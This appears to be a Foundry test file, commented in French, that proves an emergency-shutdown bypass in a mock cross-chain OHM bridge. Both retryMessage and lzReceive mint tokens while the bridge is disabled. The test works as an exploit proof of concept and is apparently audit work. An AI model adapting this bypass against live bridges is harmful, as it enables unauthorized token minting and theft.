// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CrossChainBridgePOC.sol";
import "../src/MockContracts.sol";

contract ExploitProof is Test {
    CrossChainBridgePOC bridge;
    MockMINTR mintr;
    MockOHM ohm;
    MockLZEndpoint lzEndpoint;

    address deployer = makeAddr("deployer");

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    uint16 constant SRC_CHAIN_ID = 1;
    bytes constant SRC_ADDRESS = abi.encodePacked(address(123));
    uint64 constant NONCE = 1;
    uint256 constant MINT_AMOUNT = 100e18; // 100 OHM

    function setUp() public {
        vm.startPrank(deployer);

        // Déployer les mocks
        ohm = new MockOHM();
        mintr = new MockMINTR(address(ohm));

        // Simuler le MINTR contrôlant le OHM (initialisé dans le constructeur)

        // Déployer le pont avec les mocks
        lzEndpoint = new MockLZEndpoint();
        bridge = new CrossChainBridgePOC(address(mintr), address(lzEndpoint));
        lzEndpoint.setBridge(address(bridge));

        // Configurer un trusted remote pour que lzReceive ne rejette pas le message
        bridge.setTrustedRemote(SRC_CHAIN_ID, SRC_ADDRESS);

        // Donner le rôle de bridge_admin


        vm.stopPrank();
    }

    function test_BridgeShutdownBypassViaRetryMessage() public {
        // 1. Le pont est actif par défaut, le désactiver par l'administrateur
        vm.startPrank(deployer);
        bridge.setBridgeStatus(false);
        vm.stopPrank();

        assertFalse(bridge.bridgeActive(), "Le pont devrait etre inactif apres l'arret d'urgence.");

        // Vérifier que le minting direct via _receiveMessage n'est pas possible (pas d'accès externe)
        // et que sendOhm est bloqué (vérifié dans le PoC original)

        // 2. Simuler un message de minting qui aurait échoué et serait en attente de retry.
        // Le payload contient l\'adresse du destinataire (victim) et le montant à minter.
        bytes memory payload = abi.encode(victim, MINT_AMOUNT);

        // Vérifier le solde initial de la victime.
        uint256 initialVictimBalance = ohm.balanceOf(victim);
        assertEq(initialVictimBalance, 0, "Le solde initial de la victime devrait etre 0.");

        // Simuler l\'enregistrement du message échoué (normalement fait par lzReceive).
        // Pour ce PoC, nous allons directement simuler un message échoué en définissant le hash du payload.
        vm.prank(deployer);
        bridge.setFailedMessage(SRC_CHAIN_ID, SRC_ADDRESS, NONCE, keccak256(payload));
        vm.stopPrank();

        // 3. L\'attaquant appelle retryMessage, simulant la re-tentative d\'un message précédent.
        // Dans le CrossChainBridgePOC simplifié, retryMessage appelle directement _receiveMessage
        // sans vérifier bridgeActive.
        vm.startPrank(attacker); // L\'attaquant initie la re-tentative
        bridge.retryMessage(SRC_CHAIN_ID, SRC_ADDRESS, NONCE, payload);
        vm.stopPrank();

        // 4. Vérifier que la victime a reçu les OHM, prouvant le contournement du shutdown
        uint256 finalVictimBalance = ohm.balanceOf(victim);
        assertEq(finalVictimBalance, MINT_AMOUNT, "La victime devrait avoir recu les OHM malgre le shutdown du pont.");

        console.log("Exploit reussi : ", MINT_AMOUNT / 1e18, " OHM mintes a la victime via retryMessage pendant le shutdown.");
    }

    function test_BridgeShutdownBypassViaLzReceive() public {
        // 1. Le pont est actif par défaut, le désactiver par l'administrateur
        vm.startPrank(deployer);
        bridge.setBridgeStatus(false);
        vm.stopPrank();

        assertFalse(bridge.bridgeActive(), "Le pont devrait etre inactif apres l'arret d'urgence.");

        // 2. Simuler un message de minting entrant via lzReceive
        bytes memory payload = abi.encode(victim, MINT_AMOUNT);

        // Vérifier le solde initial de la victime
        uint256 initialVictimBalance = ohm.balanceOf(victim);
        assertEq(initialVictimBalance, 0, "Le solde initial de la victime devrait etre 0.");

        // 3. Simuler l'appel de lzReceive par l'endpoint LayerZero (simulé par l'attaquant pour ce PoC)
        // Dans le CrossChainBridgePOC simplifié, lzReceive appelle directement _receiveMessage
        // sans vérifier bridgeActive.
        vm.startPrank(address(lzEndpoint)); // L\'endpoint LayerZero appelle lzReceive
        bridge.lzReceive(SRC_CHAIN_ID, SRC_ADDRESS, NONCE, payload);
        vm.stopPrank();
        // Les assertions sont faites par le deployer par défaut après l'appel de lzReceive.
        // 4. Vérifier que la victime a reçu les OHM, prouvant le contournement du shutdown
        uint256 finalVictimBalance = ohm.balanceOf(victim);
        assertEq(finalVictimBalance, MINT_AMOUNT, "La victime devrait avoir recu les OHM via lzReceive malgre le shutdown du pont.");

        console.log("Exploit reussi : ", MINT_AMOUNT / 1e18, " OHM mintes a la victime via lzReceive pendant le shutdown.");
    }
}
